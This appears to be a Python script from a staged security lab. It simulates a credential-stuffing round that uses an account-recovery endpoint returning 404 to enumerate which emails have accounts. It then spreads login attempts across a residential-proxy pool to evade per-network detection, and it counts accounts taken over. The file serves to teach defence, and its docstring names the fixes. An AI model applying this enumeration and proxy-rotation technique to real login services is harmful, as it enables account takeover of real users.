"""
Round 2 attack: the clean-list stuffer that spreads across networks.

Two moves beat per-cohort ratios:

  1. Prune the combo list through the account-recovery oracle (POST /api/account/recover answers
     404 for an address with no account), keeping only emails that exist. The unknown-account ratio
     collapses to zero.
  2. Give every surviving attempt its own network: a rented residential-proxy fleet
     (world.json's `residential_proxy_net` group: 384 addresses, one per /64). No cohort ever reaches
     the detector's minimum sample, so there is no cohort to latch.

What is left for the defender is the aggregate (a few hundred attempts spread over hundreds of
networks), with no cohort precise enough to punish without punishing everyone. That dead end is
Round 3: stop handing out the oracle, and screen the breached passwords the list is made of.

    python attacks/round2_clean_list_stuffer.py
"""

import itertools

from _common import LabClient, combo_list, is_success, login, map_threads, report, world_pool

ACTOR = "bot:cleanlist"
HEADERS = [("User-Agent", "python-requests/2.34.2"), ("Accept", "application/json")]


def run():
    fleet = itertools.cycle(world_pool("residential_proxy_net"))     # next() is atomic enough for a lab
    pairs, kept, hits = combo_list(), [], []

    def probe(pair):
        r = LabClient(ACTOR, ip=next(fleet)).post("/api/account/recover", json={"email": pair[0]}, headers=HEADERS)
        if r.status_code == 200:                                    # below Round 3: 200 = an account, 404 = none
            kept.append(pair)

    def attempt(pair):
        if is_success(login(LabClient(ACTOR, ip=next(fleet)), *pair)):
            hits.append(pair[0])

    map_threads(probe, pairs)
    map_threads(attempt, list(kept))
    return {"attacker": ACTOR, "attempted": len(pairs), "pruned_to": len(kept), "succeeded": len(hits),
            "accounts_taken_over": len(hits)}


if __name__ == "__main__":
    out = run()
    print(f"[{ACTOR}] pruned {out['attempted']} -> {out['pruned_to']} existing, {out['accounts_taken_over']} accounts taken over")
    report(**out)
